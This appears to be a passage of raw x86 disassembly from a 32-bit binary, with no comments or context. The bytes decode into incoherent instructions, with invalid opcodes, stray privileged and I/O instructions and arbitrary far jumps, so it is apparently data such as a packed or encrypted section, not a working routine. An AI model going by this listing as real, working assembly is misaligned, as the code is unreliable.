  40a379:	and    eax,0x51d9c004
  40a37e:	cdq    
  40a37f:	hlt    
  40a380:	fwait
  40a381:	cs ds fs adc al,0xbe
  40a386:	sub    esi,0xa8cf9ba9
  40a38c:	ds call 0x45c07b87
  40a392:	jg     0x40a3e0
  40a394:	pop    esi
  40a395:	ret    
  40a396:	ds and eax,0xb908c4fa
  40a39c:	push   es
  40a39d:	fwait
  40a39e:	jge    0x40a354
  40a3a0:	mov    WORD PTR ds:0xbcb9e79d,ds
  40a3a6:	arpl   WORD PTR [ecx-0x3ec8e3b5],si
  40a3ac:	es das 
  40a3ae:	xchg   BYTE PTR [edi],dl
  40a3b0:	fwait
  40a3b1:	xor    bl,bl
  40a3b3:	or     dl,BYTE PTR [edi+0x58f5dad5]
  40a3b9:	(bad)  
  40a3bb:	das    
  40a3bc:	push   ebp
  40a3bd:	xchg   ebx,eax
  40a3be:	loope  0x40a414
  40a3c0:	pushf  
  40a3c1:	mov    ds:0x3e423f3c,eax
  40a3c6:	mov    ds:0x94383ee,eax
  40a3cb:	push   0x44
  40a3cd:	sub    ch,dh
  40a3cf:	into   
  40a3d0:	pop    ecx
  40a3d1:	dec    ecx
  40a3d2:	das    
  40a3d3:	xchg   ebp,eax
  40a3d4:	sbb    eax,0xf8b7f03d
  40a3d9:	out    0x67,eax
  40a3db:	mov    edx,0x6f3da3d2
  40a3e0:	adc    bh,ch
  40a3e2:	jb     0x40a427
  40a3e4:	out    0xb7,eax
  40a3e6:	mov    esi,0x85f29b86
  40a3eb:	add    al,0x28
  40a3ed:	dec    esi
  40a3ee:	outs   dx,DWORD PTR ds:[esi]
  40a3ef:	(bad)  
  40a3f0:	imul   edi,esp,0xffffffa2
  40a3f3:	xchg   BYTE PTR ds:0x1086509d,ch
  40a3f9:	repnz sub DWORD PTR [esi-0x6eba5521],0x16
  40a401:	stos   DWORD PTR es:[edi],eax
  40a402:	pop    esp
  40a403:	fild   DWORD PTR [eax-0x52]
  40a406:	stos   BYTE PTR es:[edi],al
  40a407:	cs and esi,edi
  40a40a:	mov    esp,0xd7b9f48a
  40a40f:	rcr    DWORD PTR [edx],0xed
  40a412:	adc    eax,0x708916bd
  40a417:	xor    DWORD PTR [edi],edi
  40a419:	hlt    
  40a41a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a41b:	out    0xd5,al
  40a41d:	xchg   DWORD PTR [ecx-0x5e7d75b2],esp
  40a423:	es adc eax,0x202c7bdc
  40a429:	mov    eax,0x8b55c877
  40a42e:	dec    ebx
  40a42f:	call   0x3412:0x66066c44
  40a436:	outs   dx,BYTE PTR ds:[esi]
  40a437:	push   edx
  40a438:	sbb    ch,BYTE PTR [esi]
  40a43a:	loopne 0x40a493
  40a43c:	and    BYTE PTR [edi],ch
  40a43e:	sub    bl,bh
  40a440:	pop    esi
  40a441:	and    bl,BYTE PTR [ebx+edx*1-0x1d1ba215]
  40a448:	sahf   
  40a449:	xlat   BYTE PTR ds:[ebx]
  40a44a:	xor    al,0xca
  40a44c:	push   ebp
  40a44d:	xchg   ebx,eax
  40a44e:	adc    al,0x3e
  40a450:	jno    0x40a452
  40a452:	mov    WORD PTR [edx],?
  40a454:	retf   0x59a0
  40a457:	mov    ebx,DWORD PTR [eax]
  40a459:	cld    
  40a45a:	jae    0x40a46e
  40a45c:	xor    eax,0x9c005875
  40a461:	fs jp  0x40a45c
  40a464:	test   BYTE PTR [ebx+0x492188d7],0x24
  40a46b:	mov    ebp,0x6b148187
  40a470:	sbb    eax,0x8f207c4c
  40a475:	add    ebp,eax
  40a477:	xor    BYTE PTR fs:[ebx-0x308a985a],bl
  40a47e:	xchg   ebp,eax
  40a47f:	lahf   
  40a480:	ret    
  40a481:	dec    esp
  40a482:	push   edi
  40a483:	and    al,0x2e
  40a485:	mov    eax,DWORD PTR [ebp-0x56]
  40a488:	adc    eax,DWORD PTR [esi-0x18]
  40a48b:	jo     0x40a43d
  40a48d:	mov    eax,ebp
  40a48f:	and    ch,ch
  40a491:	mov    ds:0x419f96ca,eax
  40a496:	adc    BYTE PTR [ebx+edi*2+0x4a844901],al
  40a49d:	mov    bl,0x88
  40a49f:	rcl    DWORD PTR [edi-0x9d8e596],0xbf
  40a4a6:	loop   0x40a519
  40a4a8:	sbb    DWORD PTR [eax-0x45da9a73],esi
  40a4ae:	lods   al,BYTE PTR ds:[esi]
  40a4af:	sub    esp,DWORD PTR [esi-0x6f]
  40a4b2:	cmp    BYTE PTR [ecx+0x207b6da1],bl
  40a4b8:	clc    
  40a4b9:	push   esp
  40a4ba:	add    dh,bh
  40a4bc:	loope  0x40a522
  40a4be:	or     al,0x8b
  40a4c0:	out    0xb1,al
  40a4c2:	xchg   ecx,eax
  40a4c3:	jl     0x40a470
  40a4c5:	jb     0x40a4c3
  40a4c7:	pop    esp
  40a4c8:	call   0x672abf7c
  40a4cd:	imul   eax,edx,0xd1b8ebc1
  40a4d3:	xchg   DWORD PTR [edi+0x40ee27aa],esp
  40a4d9:	sbb    BYTE PTR [esi],0x3b
  40a4dc:	xchg   ebx,eax
  40a4dd:	push   0x3618d3c
  40a4e2:	mov    edi,0x3abc5584
  40a4e7:	data16 sbb BYTE PTR [ebx],dh
  40a4ea:	pushf  
  40a4eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a4ec:	stc    
  40a4ed:	sahf   
  40a4ee:	or     BYTE PTR [edi+esi*4],0xa3
  40a4f2:	bound  ebx,QWORD PTR [esi-0x102d092a]
  40a4f8:	cmp    ebp,DWORD PTR [ecx-0x7d]
  40a4fb:	clc    
  40a4fc:	rcr    DWORD PTR [edx+0xdf8f23f],1
  40a502:	and    eax,0x92281e82
  40a507:	lods   al,BYTE PTR ds:[esi]
  40a508:	or     eax,0x9d175c77
  40a50d:	xor    ah,al
  40a50f:	push   ebx
  40a510:	inc    edx
  40a511:	cmp    ah,BYTE PTR [ebp-0x3]
  40a514:	push   es
  40a515:	das    
  40a516:	cmp    DWORD PTR [eax-0x3b539b26],edi
  40a51c:	mov    BYTE PTR [ecx-0x427754ea],dh
  40a522:	push   esi
  40a523:	mov    esp,0xd3b99c93
  40a528:	push   esi
  40a529:	inc    ebp
  40a52a:	adc    esp,ebp
  40a52c:	fsub   QWORD PTR [edi+eiz*4+0x30d6dcb1]
  40a533:	fld    DWORD PTR [edi-0x3a]
  40a536:	pop    eax
  40a537:	push   ds
  40a538:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a539:	out    dx,al
  40a53a:	popa   
  40a53b:	jmp    0xdc54:0x965a07aa
  40a542:	rcr    DWORD PTR [ebp-0x21],1
  40a545:	inc    esi
  40a546:	xchg   edi,eax
  40a547:	pushf  
  40a548:	inc    esi
  40a549:	fld    TBYTE PTR [esi]
  40a54b:	sub    ebx,ecx
  40a54d:	mov    cl,0xec
  40a54f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a550:	in     al,dx
  40a551:	xor    DWORD PTR [esp+ebx*1],ebx
  40a554:	in     eax,0x2
  40a556:	dec    ebp
  40a557:	sub    cl,dh
  40a559:	rcl    al,1
  40a55b:	fist   WORD PTR [ecx+0x36]
  40a55e:	and    al,0xbe
  40a560:	fnstcw WORD PTR [edx]
  40a562:	and    eax,0xd0bfc205
  40a567:	adc    DWORD PTR [edx-0x5db2d83e],ecx
  40a56d:	mov    ds:0x7401d2e5,al
  40a572:	push   0x7edf7bdb
  40a577:	pop    eax
  40a578:	jno    0x40a56e
  40a57a:	push   edx
  40a57b:	add    DWORD PTR [esi+ebx*1+0x7f],esp
  40a57f:	xor    DWORD PTR [ebp-0x67],edi
  40a582:	lahf   
  40a583:	shr    edx,0x67
  40a586:	push   esi
  40a587:	or     BYTE PTR [ecx],cl
  40a589:	in     eax,0xe3
  40a58b:	fst    st(4)
  40a58d:	dec    esi
  40a58e:	inc    edx
  40a58f:	(bad)
  40a593:	rol    BYTE PTR [edx+0x62fd9ae0],1
  40a599:	nop
  40a59a:	sbb    esi,ebx
  40a59c:	icebp  
  40a59d:	hlt    
  40a59e:	pop    esi
  40a59f:	mov    al,0x27
  40a5a1:	mov    bh,0x48
  40a5a3:	push   0xffffff9f
  40a5a5:	aad    0x3a
  40a5a7:	add    DWORD PTR [eax],eax
  40a5a9:	into   
  40a5aa:	xlat   BYTE PTR ds:[ebx]
  40a5ab:	mov    eax,ds:0xbf2a8112
  40a5b0:	dec    eax
  40a5b1:	ficomp WORD PTR [ebx]
  40a5b3:	cmp    eax,0x6d06960a
  40a5b8:	shl    DWORD PTR [esi-0x49],0x17
  40a5bc:	mov    cl,0x16
  40a5be:	bound  eax,QWORD PTR [eax+0x4b]
  40a5c1:	(bad)  
  40a5c3:	cli    
  40a5c4:	out    dx,eax
  40a5c5:	or     esi,DWORD PTR [ebp-0x68984c47]
  40a5cb:	mov    dh,0x93
  40a5cd:	adc    DWORD PTR ds:[ecx+0x51],edi
  40a5d1:	dec    edx
  40a5d2:	dec    eax
  40a5d3:	call   0x6d2d1b6f
  40a5d8:	push   0x1f
  40a5da:	int    0x59
  40a5dc:	rcl    DWORD PTR [ebp+0x61218054],1
  40a5e2:	call   0xb0c20087
  40a5e7:	sbb    dl,bl
  40a5e9:	(bad)  
  40a5eb:	adc    ch,BYTE PTR [eax+0x39]
  40a5ee:	inc    BYTE PTR [edx-0x22]
  40a5f1:	pop    esi
  40a5f2:	cld    
  40a5f3:	and    eax,0xc9baddee
  40a5f8:	or     eax,0x4a1db212
  40a5fd:	push   es
  40a5fe:	or     dh,BYTE PTR [edx+0x3e14f466]
  40a604:	pop    ds
  40a605:	jae    0x40a5c0
  40a607:	mov    cl,0xd3
  40a609:	retf   
  40a60a:	jmp    0x40a5c4
  40a60c:	sbb    al,0xe7
  40a60e:	dec    edi
  40a60f:	xchg   ebp,eax
  40a610:	ja     0x40a59c
  40a612:	push   ds
  40a613:	mov    al,ds:0xf621c8c4
  40a618:	cmp    al,0x51
  40a61a:	out    dx,eax
  40a61b:	sub    eax,0x3c7e9a62
  40a620:	pop    edx
  40a621:	pop    ebx
  40a622:	mov    edi,0x302d6a9
  40a627:	hlt    
  40a628:	xchg   esi,eax
  40a629:	sub    eax,0x161cb4b8
  40a62e:	mov    dh,0xd9
  40a630:	outs   dx,BYTE PTR ds:[esi]
  40a631:	mov    WORD PTR [ebp+0x41],ds
  40a634:	xchg   ebp,eax
  40a635:	add    ebx,eax
  40a637:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a638:	mov    dl,0x72
  40a63a:	mov    al,0x4d
  40a63c:	sub    al,0x8f
  40a63e:	mov    ebx,0x99338427
  40a643:	sbb    edx,ecx
  40a645:	cmp    al,0x9
  40a647:	(bad)  
  40a648:	pop    esp
  40a649:	lahf   
  40a64a:	mov    eax,ds:0xbe151983
  40a64f:	rcl    BYTE PTR [ecx],1
  40a651:	std    
  40a652:	je     0x40a626
  40a654:	mov    dh,0x11
  40a656:	loopne 0x40a6d0
  40a658:	mov    DWORD PTR [ebp-0x3e770b10],esp
  40a65e:	push   edx
  40a65f:	stc    
  40a660:	push   ds
  40a661:	jp     0x40a666
  40a663:	adc    eax,0xd50b2c75
  40a668:	pop    es
  40a669:	cmp    al,BYTE PTR [edi+esi*4+0x3b]
  40a66d:	(bad)  [edi+ebx*4+0x798bac8a]
  40a674:	push   ecx
  40a675:	data16 mov dh,0x23
  40a678:	shr    BYTE PTR [esi-0x5625f6f6],0xb1
  40a67f:	cmp    BYTE PTR [ebp-0x32ef64ea],dl
  40a685:	xor    DWORD PTR [ebp-0x1c0172d6],edx
  40a68b:	(bad)  
  40a68d:	call   0x9fd:0x248310f2
  40a694:	pop    ebp
  40a695:	lahf   
  40a696:	in     eax,0xe8
  40a698:	(bad)  
  40a699:	outs   dx,DWORD PTR ds:[esi]
  40a69a:	push   0xb677895e
  40a69f:	jb     0x40a655
  40a6a1:	jmp    0x40a657
  40a6a3:	or     bh,BYTE PTR [ecx-0xb9473f1]
  40a6a9:	shl    BYTE PTR [edi-0x1],1
  40a6ac:	jo     0x40a702
  40a6ae:	stos   BYTE PTR es:[edi],al
  40a6af:	aas    
  40a6b0:	mov    fs,esp
  40a6b2:	shr    DWORD PTR [eax-0x2f],0xa
  40a6b6:	outs   dx,BYTE PTR ds:[esi]
  40a6b7:	mov    ds:0xd69b0032,eax
  40a6bd:	clc    
  40a6be:	add    ecx,edi
  40a6c0:	sub    DWORD PTR [eax+0x70848d49],ebx
  40a6c6:	scas   eax,DWORD PTR es:[edi]
  40a6c7:	or     eax,DWORD PTR [esi+eax*8-0x46ff69b0]
  40a6ce:	aaa    
  40a6cf:	(bad)  
  40a6d0:	or     ebp,DWORD PTR [ebp-0x1e4adba1]
  40a6d6:	stos   BYTE PTR es:[edi],al
  40a6d7:	xchg   BYTE PTR [edx-0x2a],cl
  40a6da:	test   BYTE PTR [ebp+0x7c],0xb0
  40a6de:	std    
  40a6df:	arpl   WORD PTR [edx+0xf],dx
  40a6e2:	shr    BYTE PTR [ecx],1
  40a6e4:	fnsave [ecx-0x4d]
  40a6e7:	push   ds
  40a6e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a6e9:	stos   BYTE PTR es:[edi],al
  40a6ea:	inc    edx
  40a6eb:	inc    ebx
  40a6ec:	dec    eax
  40a6ed:	pop    es
  40a6ee:	out    0xea,al
  40a6f0:	rep lods eax,DWORD PTR ds:[esi]
  40a6f2:	shr    DWORD PTR [esi],0x4f
  40a6f5:	mov    ch,dl
  40a6f7:	add    dl,ch
  40a6f9:	pushf  
  40a6fa:	jl     0x40a708
  40a6fc:	ror    BYTE PTR ds:[esi+0x687b8723],cl
  40a703:	push   cs
  40a704:	daa    
  40a705:	lods   eax,DWORD PTR ds:[esi]
  40a706:	xbegin 0x8344a0b5
  40a70c:	or     ecx,0xa3291712
  40a712:	shl    BYTE PTR [eax],cl
  40a714:	les    eax,FWORD PTR [edx]
  40a716:	leave  
  40a717:	aas    
  40a718:	mov    ah,0xe6
  40a71a:	mov    eax,gs
  40a71c:	inc    esp
  40a71d:	icebp  
  40a71e:	out    0x2f,eax
  40a720:	jl     0x40a6ef
  40a722:	and    DWORD PTR [ebx-0x79],esp
  40a725:	push   edi
  40a726:	loop   0x40a6d0
  40a728:	xchg   DWORD PTR [edx+edi*4],esp
  40a72b:	xor    eax,0x52b8d362
  40a730:	mov    ds:0x9343f04e,al
  40a735:	jge    0x40a77b
  40a737:	dec    BYTE PTR [edx+0x7ae6db89]
  40a73d:	ficomp WORD PTR [ecx-0x15]
  40a740:	mov    edx,DWORD PTR [ebx-0x4d]
  40a743:	dec    edx
  40a744:	xor    ah,BYTE PTR [eax-0x72]
  40a747:	mov    edi,DWORD PTR [edi+ecx*4]
  40a74a:	inc    edx
  40a74b:	inc    edi
  40a74d:	ins    DWORD PTR es:[edi],dx
  40a74e:	sub    BYTE PTR [esi-0x3c41e466],dh
  40a754:	call   0xe8f0:0xd7468061
  40a75b:	xor    DWORD PTR [edx],edi
  40a75d:	xchg   edi,eax
  40a75e:	inc    ebx
  40a75f:	dec    ebx
  40a760:	scas   eax,DWORD PTR es:[edi]
  40a761:	adc    eax,0x227bf7b9
  40a766:	sahf   
  40a767:	add    dl,ch
  40a769:	sti    
  40a76a:	sub    dh,bl
  40a76c:	into   
  40a76d:	call   0x2422:0x33a5f450
  40a774:	add    ch,ah
  40a776:	mov    eax,0x558e7d1f
  40a77b:	sub    edi,edx
  40a77d:	es dec eax
  40a77f:	call   0x7e8225e7
  40a784:	cmp    esi,esi
  40a786:	icebp  
  40a787:	repz inc esp
  40a789:	mov    ds:0xd20e0859,al
  40a78e:	in     eax,dx
  40a78f:	retf   0x56a6
  40a792:	jle    0x40a7ee
  40a794:	aad    0x7f
  40a796:	loop   0x40a777
  40a798:	mov    es,WORD PTR [esi+0x39]
  40a79b:	loope  0x40a7d2
  40a79d:	lea    esi,[ebp+ecx*4+0x3ee2bd20]
  40a7a4:	pop    ecx
  40a7a5:	jne    0x40a77d
  40a7a7:	test   DWORD PTR [eax*4-0x3221d1f],esi
  40a7ae:	sub    eax,0x7737760e
  40a7b3:	retf   0x9a4
  40a7b6:	(bad)  
  40a7b7:	loope  0x40a823
  40a7b9:	mov    ds:0xa8d01b93,eax
  40a7be:	scas   eax,DWORD PTR es:[edi]
  40a7bf:	sub    BYTE PTR [esi+0x11],ch
  40a7c2:	jge    0x40a833
  40a7c4:	or     BYTE PTR [ebx+0x235b8648],dl
  40a7ca:	add    eax,0x9a965dd4
  40a7cf:	aam    0x76
  40a7d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a7d2:	cld    
  40a7d3:	or     bh,cl
  40a7d5:	sbb    eax,0x6cb8ee14
  40a7da:	je     0x40a77e
  40a7dc:	ret    
  40a7dd:	outs   dx,DWORD PTR ds:[esi]
  40a7de:	jb     0x40a761
  40a7e0:	jle    0x40a849
  40a7e2:	stos   DWORD PTR es:[edi],eax
  40a7e3:	add    bl,BYTE PTR [ebp-0x5bea57ef]
  40a7e9:	test   BYTE PTR [eax-0x58],al
  40a7ec:	jo     0x40a7cb
  40a7ee:	pop    edi
  40a7ef:	out    0xbf,al
  40a7f1:	mov    dl,0xb2
  40a7f3:	popf   
  40a7f4:	ins    BYTE PTR es:[edi],dx
  40a7f5:	jge    0x40a85a
  40a7f7:	ret    0xbb61
  40a7fa:	sbb    BYTE PTR [esi+0x22],0xd
  40a7fe:	xor    DWORD PTR [esi+0x8],esi
  40a801:	dec    edx
  40a802:	xchg   edx,eax
  40a803:	xchg   ecx,eax
  40a804:	cwde   
  40a805:	sti    
  40a806:	xchg   esi,eax
  40a807:	dec    edi
  40a808:	in     eax,dx
  40a809:	push   cs
  40a80a:	(bad)
  40a80e:	popw   ss
  40a810:	mov    DWORD PTR [esi],esp
  40a812:	ins    BYTE PTR es:[edi],dx
  40a813:	lods   eax,DWORD PTR ds:[esi]
  40a814:	push   ebx
  40a815:	test   bl,al
  40a817:	repz jmp 0x19db929d
  40a81d:	(bad)  
  40a81e:	cmp    bl,cl
  40a820:	gs push edi
  40a822:	(bad)  
  40a824:	sbb    eax,0x65492aeb
  40a829:	inc    eax
  40a82a:	shr    BYTE PTR [ecx],cl
  40a82c:	inc    esi
  40a82d:	mov    eax,ds:0xb66bc2d
  40a832:	mov    edx,0x37f4a3f0
  40a837:	lahf   
  40a838:	loop   0x40a855
  40a83a:	cwde   
  40a83b:	lods   eax,DWORD PTR ds:[esi]
  40a83c:	mov    edx,0xccaf46c
  40a841:	sub    eax,0x1680ed25
  40a846:	jecxz  0x40a7c8
  40a848:	push   esi
  40a849:	or     edi,esi
  40a84b:	fucomip st,st(6)
  40a84d:	push   cs
  40a84e:	cmc    
  40a84f:	mov    bl,0xc7
  40a851:	(bad)  
  40a852:	aas    
  40a853:	mov    ds:0x7dda6629,al
  40a858:	and    bl,cl
  40a85a:	mov    ch,0xc2
  40a85c:	enter  0x45a4,0x3c
  40a860:	mov    bl,0x83
  40a862:	(bad)  
  40a863:	and    DWORD PTR [eax],eax
  40a865:	jg     0x40a836
  40a867:	shl    BYTE PTR ds:0xf31d17a7,1
  40a86d:	mov    ds:0x5dc65159,al
  40a872:	push   edx
  40a873:	pop    ecx
  40a874:	add    bh,BYTE PTR fs:[eax]
  40a877:	mov    ah,0xc5
  40a879:	sub    edx,DWORD PTR [ecx+0x273891cd]
  40a87f:	xchg   BYTE PTR [edx-0x5bbdce9e],dl
  40a885:	cmc    
  40a886:	pop    esi
  40a887:	cli    
  40a888:	dec    edx
  40a889:	inc    ecx
  40a88a:	push   ss
  40a88b:	(bad)  
  40a88c:	out    0xc3,al
  40a88e:	mov    ebp,0x7e7934e3
  40a894:	and    dh,al
  40a896:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a897:	fwait
  40a898:	mov    ebp,ebp
  40a89a:	sbb    bh,BYTE PTR [eax-0x16fd948d]
  40a8a0:	mov    esi,0x88268789
  40a8a5:	loop   0x40a8c7
  40a8a7:	outs   dx,DWORD PTR ds:[esi]
  40a8a8:	cmp    cl,BYTE PTR [eax+0x377d0ad9]
  40a8ae:	jno    0x40a8ed
  40a8b0:	push   esp
  40a8b1:	pop    edi
  40a8b2:	mov    ah,0x9c
  40a8b4:	std    
  40a8b5:	cmp    DWORD PTR [ebp+0x3b],ecx
  40a8b8:	jl     0x40a8a3
  40a8ba:	add    BYTE PTR [esi-0x230cd926],bl
  40a8c0:	loopne 0x40a925
  40a8c2:	xor    eax,0x4eac5986
  40a8c7:	in     eax,0x6
  40a8c9:	jbe    0x40a910
  40a8cb:	sub    ecx,DWORD PTR [ecx+esi*4]
  40a8ce:	and    eax,0xfeb317bc
  40a8d3:	pop    es
  40a8d4:	js     0x40a936
  40a8d6:	xor    dh,al
  40a8d8:	inc    edx
  40a8d9:	mov    bh,0x1a
  40a8db:	pop    ebp
  40a8dc:	mov    dl,0x86
  40a8de:	fidivr WORD PTR [ebp+0x6040ddfe]
  40a8e4:	loope  0x40a916
  40a8e6:	test   DWORD PTR [ecx],esi
  40a8e8:	stos   DWORD PTR es:[edi],eax
  40a8e9:	gs iret 
  40a8eb:	ins    DWORD PTR es:[edi],dx
  40a8ec:	aam    0x70
  40a8ee:	pop    ebx
  40a8ef:	out    0xbf,eax
  40a8f1:	sahf   
  40a8f2:	pushf  
  40a8f3:	popf   
  40a8f4:	call   0x4490:0xb024c7c
  40a8fb:	adc    dh,BYTE PTR [ebp-0x73035a78]
  40a901:	fwait
  40a902:	icebp  
  40a903:	jne    0x40a92e
  40a905:	ins    BYTE PTR es:[edi],dx
  40a906:	adc    BYTE PTR [eax],dl
  40a908:	bound  ecx,QWORD PTR [eax+edi*1+0x52]
  40a90c:	mov    ?,WORD PTR [eax+esi*1]
  40a90f:	and    esi,DWORD PTR [edi-0x1d831280]
  40a915:	adc    al,0x91
  40a917:	jmp    0x40a8bf
  40a919:	test   al,0x1a
  40a91b:	iret   
  40a91c:	shl    BYTE PTR [eax-0x61],0xe5
  40a920:	xor    bl,dl
  40a922:	and    dl,cl
  40a924:	and    al,0x3c
  40a926:	mov    cl,0x2d
  40a928:	cmp    ebx,DWORD PTR [ebp+0x396a0ad8]
  40a92e:	mov    bh,0xb1
  40a930:	je     0x40a92d
  40a932:	ins    BYTE PTR es:[edi],dx
  40a933:	sbb    esi,DWORD PTR [esp+esi*2+0x74]
  40a937:	rcl    ebp,0xd2
  40a93a:	inc    edx
  40a93b:	out    0x28,al
  40a93d:	nop
  40a93e:	out    dx,eax
  40a93f:	pusha  
  40a940:	cli    
  40a941:	data16 das 
  40a943:	dec    ecx
  40a944:	push   ebp
  40a945:	nop
  40a946:	cmp    ebx,DWORD PTR [edx]
  40a948:	jg     0x40a95e
  40a94a:	loop   0x40a925
  40a94c:	inc    edi
  40a94d:	mov    edi,DWORD PTR [edx-0x4556e0f2]
  40a953:	jb     0x40a8f9
  40a955:	jmp    0x40a9c7
  40a957:	mov    ebx,0x9283d2ba
  40a95c:	retf   0xeabb
  40a95f:	xor    al,0xa5
  40a961:	(bad)  
  40a962:	push   eax
  40a963:	sar    dh,0xac
  40a966:	jmp    0x40a9a1
  40a968:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a969:	sbb    eax,edx
  40a96b:	pop    eax
  40a96c:	xchg   eax,ebp
  40a96e:	add    cl,0x61
  40a971:	mov    WORD PTR [edx-0x23],?
  40a974:	adc    eax,0xbb085bba
  40a979:	cld    
  40a97a:	fsubrp st(5),st
  40a97c:	dec    esp
  40a97d:	mov    al,0x85
  40a97f:	fisttp WORD PTR [ebx-0x2b49cfed]
  40a985:	or     ecx,edx
  40a987:	fstp   TBYTE PTR [ebx-0x17]
  40a98a:	sti    
  40a98b:	lahf   
  40a98c:	xor    BYTE PTR [ebx+edi*8],dh
  40a98f:	jbe    0x40a999
  40a991:	and    esp,DWORD PTR [edi+0x58]
  40a994:	cwde   
  40a995:	jmp    FWORD PTR [edx]
  40a997:	pop    ecx
  40a998:	sub    BYTE PTR [edx],0x39
  40a99b:	adc    eax,0x6403532f
  40a9a0:	fwait
  40a9a1:	cmp    cl,0x49
  40a9a4:	push   esp
  40a9a5:	nop
  40a9a6:	mov    DWORD PTR [ecx],ebp
  40a9a8:	cmp    ch,BYTE PTR [ecx-0x1d]
  40a9ab:	out    dx,al
  40a9ac:	sub    eax,0x95b2334f
  40a9b1:	bound  edi,QWORD PTR [edx]
  40a9b3:	xlat   BYTE PTR ds:[ebx]
  40a9b4:	mov    esi,DWORD PTR [esi]
  40a9b6:	leave  
  40a9b7:	cli    
  40a9b8:	add    dl,BYTE PTR [ebx]
  40a9ba:	jns    0x40a95c
  40a9bc:	and    eax,0xef0f4af2
  40a9c1:	cli    
  40a9c2:	mov    ds:0xa01104d2,al
  40a9c7:	jge    0x40aa43
  40a9c9:	inc    esp
  40a9ca:	fstp   DWORD PTR [ebx+0xb82972b]
  40a9d0:	or     al,0xf1
  40a9d2:	cmp    cx,WORD PTR [eax]
  40a9d5:	frstor [esi+0x28]
  40a9d8:	mov    BYTE PTR [ebp-0x6bdaa0e6],cl
  40a9de:	cmp    edx,DWORD PTR [esi-0x77]
  40a9e1:	shl    ebx,cl
  40a9e3:	sbb    DWORD PTR [ecx],esp
  40a9e5:	scas   eax,DWORD PTR es:[edi]
  40a9e6:	push   ecx
  40a9e7:	loope  0x40a9e8
  40a9e9:	jnp    0x40a9cf
  40a9eb:	scas   eax,DWORD PTR es:[edi]
  40a9ec:	push   ds
  40a9ed:	cmp    bl,BYTE PTR ds:0x472a16f3
  40a9f3:	fs jg  0x40aa3b
  40a9f6:	sub    edi,esi
  40a9f8:	fidiv  WORD PTR [esi-0x32]
  40a9fb:	xor    DWORD PTR [ebx+0x2e],eax
  40a9fe:	in     al,dx
  40a9ff:	inc    edx
  40aa00:	fwait
  40aa01:	or     BYTE PTR [edi+0x68],al
  40aa04:	jp     0x40a996
  40aa06:	pop    esp
  40aa07:	and    bh,al
  40aa09:	push   ds
  40aa0a:	int3   
  40aa0b:	pop    es
  40aa0c:	cdq    
  40aa0d:	out    0x61,al
  40aa0f:	fld    QWORD PTR [ebp-0x68213cf2]
  40aa15:	sbb    eax,0xb1a2fec2
  40aa1a:	scas   al,BYTE PTR es:[edi]
  40aa1b:	loop   0x40a9be
  40aa1d:	xlat   BYTE PTR ds:[ebx]
  40aa1e:	cwde   
  40aa1f:	mov    ecx,0x4a6d8d5a
  40aa24:	inc    ebp
  40aa25:	ins    BYTE PTR es:[edi],dx
  40aa26:	push   ds
  40aa27:	jb     0x40aa1d
  40aa29:	test   al,0x77
  40aa2b:	xchg   esp,eax
  40aa2c:	test   DWORD PTR [edi+0x2f],edi
  40aa2f:	int3   
  40aa30:	pop    ebx
  40aa31:	add    al,0x47
  40aa33:	xchg   ebx,eax
  40aa34:	cmp    ah,ah
  40aa36:	push   edx
  40aa37:	mov    ecx,0xb666c636
  40aa3c:	mov    edi,0x6e6c56b0
  40aa41:	adc    dh,0x62
  40aa44:	dec    esi
  40aa45:	and    edi,esi
  40aa47:	or     dl,BYTE PTR [ebx+0x41e1f85b]
  40aa4d:	loope  0x40aabc
  40aa4f:	daa    
  40aa50:	enter  0x5033,0xca
  40aa54:	push   cs
  40aa55:	(bad)  
  40aa56:	ret    0x58b9
  40aa59:	jp     0x40aacb
  40aa5b:	retfw  
  40aa5d:	and    edx,DWORD PTR [eax]
  40aa5f:	push   ebp
  40aa60:	sti    
  40aa61:	or     BYTE PTR [eax],dh
  40aa63:	push   eax
  40aa64:	cmc    
  40aa65:	dec    esi
  40aa66:	(bad)  ds:0x76dcf9ac
  40aa6c:	shl    ecx,cl
  40aa6e:	add    eax,0xc56f0352
  40aa73:	inc    edi
  40aa74:	pop    DWORD PTR [edx]
  40aa76:	shl    cl,cl
  40aa78:	or     bh,BYTE PTR [ecx-0xe]
  40aa7b:	jg     0x40aa95
  40aa7d:	enter  0xfb94,0x5a
  40aa81:	jl     0x40aa8a
  40aa83:	adc    BYTE PTR [ecx-0x713f9b5e],dh
  40aa89:	es mov cl,dh
  40aa8c:	mov    ebx,0xd22986ba
  40aa91:	pop    es
  40aa92:	push   0x18
  40aa94:	ja     0x40aae0
  40aa96:	iret   
  40aa97:	mov    dh,0x71
  40aa99:	jge    0x40aa37
  40aa9b:	scas   al,BYTE PTR es:[edi]
  40aa9c:	push   ds
  40aa9d:	jmp    0x956d20e7
  40aaa2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aaa3:	and    DWORD PTR ss:[eax],edx
  40aaa6:	cs push 0xfa16b0a4
  40aaac:	lock inc ebp
  40aaae:	sbb    dl,BYTE PTR [edx+ebp*4]
  40aab1:	jo     0x40aa82
  40aab3:	cs jns 0x40aabe
  40aab6:	mov    esi,edi
  40aab8:	sub    dh,ah
  40aaba:	and    ebp,ebx
  40aabc:	call   0xdad8:0xc7c3adc1
  40aac3:	test   BYTE PTR [ebx+0x202590bc],0xac
  40aaca:	and    al,0x4c
  40aacc:	(bad)  
  40aacd:	or     eax,0x2deaf369
  40aad2:	fisubr WORD PTR [esi+0x60]
  40aad5:	sub    eax,0x5d
  40aad8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aad9:	sbb    DWORD PTR [edi],esp
  40aadb:	cmp    ebx,DWORD PTR [eax]
  40aadd:	push   edi
  40aade:	fs fsubr st(5),st
  40aae1:	adc    eax,0xdeb33f69
  40aae6:	cmp    ecx,DWORD PTR [esi]
  40aae8:	cmp    esp,0x2f
  40aaeb:	dec    eax
  40aaec:	(bad)  
  40aaed:	or     BYTE PTR [edi+0x2d],dl
  40aaf0:	push   0xe17c9f34
  40aaf5:	js     0x40aa83
